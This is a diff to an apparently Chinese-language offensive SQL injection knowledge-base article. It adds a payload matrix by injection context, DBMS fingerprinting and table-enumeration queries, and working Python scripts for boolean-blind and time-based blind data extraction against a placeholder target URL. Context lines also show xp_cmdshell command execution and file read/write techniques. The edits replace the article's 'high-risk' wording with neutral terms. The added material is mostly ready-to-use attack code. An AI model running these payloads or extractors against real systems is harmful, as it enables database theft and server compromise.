@@ -33,7 +33,7 @@ keywords:
   - "LOAD_FILE"
   - "宽字节注入"
   - "extractvalue"
-difficulty: "beginner"
+difficulty: "intermediate"
 tags:
   - "database"
   - "sql-injection"
@@ -42,7 +42,7 @@ tags:
   - "waf-bypass"
   - "blind-injection"
 language: "zh-CN"
-last_updated: "2026-06-25"
+last_updated: "2026-07-04"
 related_articles: []
 ---
 # SQL Injection Core — SQL 注入基础与全类型覆盖
@@ -105,6 +105,54 @@ related_articles: []
 -- Oracle
 ?id=1 AND UTL_INADDR.GET_HOST_NAME IS NOT NULL
 ?id=1 AND DBMS_PIPE.RECEIVE_MESSAGE('a',3) IS NOT NULL
+```
+
+### 1.4 注入上下文矩阵
+
+同一个参数进 SQL 后可能落在不同语法位置。先判断上下文，再选 payload；不要把 `UNION SELECT` 硬塞进 `ORDER BY`、`LIMIT`、`LIKE` 或 JSON path 里。
+
+| 上下文 | 原始 SQL 形态 | 探测 payload | 命中信号 |
+|---|---|---|---|
+| 整数条件 | `WHERE id=$id` | `1 AND 1=2` / `1 AND 1=1` | 列表空/正常 |
+| 字符串条件 | `WHERE name='$q'` | `' AND '1'='2` | 响应差异或 SQL 报错 |
+| LIKE 搜索 | `LIKE '%$q%'` | `%\' AND 1=1-- ` | 搜索结果数量变化 |
+| IN 列表 | `id IN ($ids)` | `1) OR 1=1-- ` | 越过列表限制 |
+| ORDER BY | `ORDER BY $sort` | `CASE WHEN(1=1) THEN id ELSE name END` | 排序字段变化 |
+| LIMIT/OFFSET | `LIMIT $n` | `1 UNION SELECT ...` / `1 OFFSET ...` | 分页数量或报错变化 |
+| INSERT | `VALUES ('$v')` | `x'||(SELECT ...)||'` | 写入后展示处触发 |
+| JSON 查询 | `JSON_EXTRACT(data,'$.${k}')` | `x') OR 1=1-- ` | JSON 路径错误或结果扩展 |
+| Header/Cookie | `WHERE token='$cookie'` | 修改 Cookie 值 | 登录态/权限变化 |
+
+如果只有“错误页变了”但数据不变，先记录 SQL parser 已经接触到 payload；下一步换布尔/时间表达式确认语义执行。
+
+### 1.5 DBMS 指纹速查矩阵
+
+| DBMS | 版本函数 | 当前库/用户 | 时间函数 | Catalog |
+|---|---|---|---|---|
+| MySQL/MariaDB | `@@version` | `database()` / `user()` | `SLEEP(3)` | `information_schema.tables` |
+| PostgreSQL | `version()` | `current_database()` / `current_user` | `pg_sleep(3)` | `pg_catalog.pg_tables` |
+| MSSQL | `@@version` | `DB_NAME()` / `SYSTEM_USER` | `WAITFOR DELAY '0:0:3'` | `sys.tables`, `sys.columns` |
+| Oracle | `banner FROM v$version` | `SYS_CONTEXT(...)` | `DBMS_PIPE.RECEIVE_MESSAGE` | `all_tables`, `all_tab_columns` |
+| SQLite | `sqlite_version()` | `main` | 笛卡尔积/随机 blob | `sqlite_master` |
+
+对应抽表语句：
+
+```sql
+-- MySQL
+SELECT table_name FROM information_schema.tables WHERE table_schema=database()
+SELECT column_name FROM information_schema.columns WHERE table_name='users'
+
+-- PostgreSQL
+SELECT tablename FROM pg_catalog.pg_tables WHERE schemaname NOT IN ('pg_catalog','information_schema')
+SELECT column_name FROM information_schema.columns WHERE table_name='users'
+
+-- MSSQL
+SELECT name FROM sys.tables
+SELECT name FROM sys.columns WHERE object_id=OBJECT_ID('users')
+
+-- SQLite
+SELECT name FROM sqlite_master WHERE type='table'
+SELECT sql FROM sqlite_master WHERE name='users'
 ```
 
 ## 2. 联合查询注入 (UNION)
@@ -197,6 +245,56 @@ related_articles: []
 ?id=1 AND (SELECT pass FROM users LIMIT 0,1) REGEXP '^[a-f]'--
 ```
 
+### 4.3 布尔盲注抽取器
+
+布尔盲注不要线性爆字符，优先二分 ASCII；如果响应长度不稳定，用多个 marker 共同判断。
+
+```python
+import requests
+
+TRUE_MARKERS = ["Welcome", "result", "profile"]
+FALSE_MARKERS = ["not found", "empty", "0 rows"]
+
+def is_true(resp: requests.Response) -> bool:
+    text = resp.text
+    if any(m in text for m in TRUE_MARKERS):
+        return True
+    if any(m in text for m in FALSE_MARKERS):
+        return False
+    return len(text) > 1200
+
+def boolean_probe(url, template, expr):
+    payload = template.replace("§", expr)
+    r = requests.get(url, params={"id": payload}, timeout=8)
+    return is_true(r)
+
+def extract_ascii(url, template, sql_expr, max_len=64):
+    out = []
+    for pos in range(1, max_len + 1):
+        lo, hi = 32, 126
+        while lo <= hi:
+            mid = (lo + hi) // 2
+            expr = f"ASCII(SUBSTR(({sql_expr}),{pos},1))>{mid}"
+            if boolean_probe(url, template, expr):
+                lo = mid + 1
+            else:
+                hi = mid - 1
+        ch = chr(lo)
+        if ch == " " and not boolean_probe(url, template, f"LENGTH(({sql_expr}))>={pos}"):
+            break
+        out.append(ch)
+        print("".join(out))
+    return "".join(out)
+
+extract_ascii(
+    "https://target/item",
+    "1 AND (§)-- ",
+    "SELECT database()",
+)
+```
+
+失败样本：True/False 长度随机跳动，说明页面有动态内容；改用固定字段、状态码、跳转位置、特定 DOM 片段或响应哈希去判定。
+
 ## 5. 时间盲注 (Time-based)
 
 ### 5.1 MySQL
@@ -224,6 +322,35 @@ related_articles: []
 ```sql
 ?id=1; IF (1=1) WAITFOR DELAY '0:0:3'--
 ```
+
+### 5.4 时间盲注抗抖动
+
+时间盲注先采样 baseline，不要只凭一次 3 秒延迟判断。实战里把延迟设成 baseline p95 的 2-3 倍，再做重复投票。
+
+```python
+import statistics
+import time
+import requests
+
+def timed(url, payload):
+    t0 = time.perf_counter()
+    requests.get(url, params={"id": payload}, timeout=12)
+    return time.perf_counter() - t0
+
+def calibrate(url):
+    samples = [timed(url, "1") for _ in range(8)]
+    return statistics.mean(samples), max(samples)
+
+def time_true(url, template, expr, delay=4, votes=3):
+    payload = template.replace("§", f"IF({expr},SLEEP({delay}),0)")
+    hits = 0
+    for _ in range(votes):
+        if timed(url, payload) > delay * 0.75:
+            hits += 1
+    return hits >= 2
+```
+
+命中样本：True 分支稳定超过阈值，False 分支接近 baseline；失败样本：两边都慢，可能是锁等待、WAF 排队、笛卡尔积误伤或网络抖动。
 
 ## 6. 文件读写
 
@@ -271,8 +398,8 @@ EXEC xp_cmdshell 'whoami';
 2. 用闭合符和布尔表达式确认是否存在 SQL 语义差异
 3. 通过报错信息、时间函数或特征语句识别 DBMS 指纹
 4. 有回显：走 ORDER BY → UNION 列数 → 回显位 → 表/列/数据提取
-5. 无回显：走 Boolean/Time blind，优先提取 database/user/version 等低风险指纹
-6. 有文件权限：评估 LOAD_FILE / INTO OUTFILE / xp_cmdshell 等高风险能力
+5. 无回显：走 Boolean/Time blind，优先提取 database/user/version 等稳定指纹
+6. 有文件权限：评估 LOAD_FILE / INTO OUTFILE / xp_cmdshell 等扩展能力
 7. 遇到 WAF：记录拦截规则后转入高级绕过文档，避免无序 payload 爆破
 ```
 
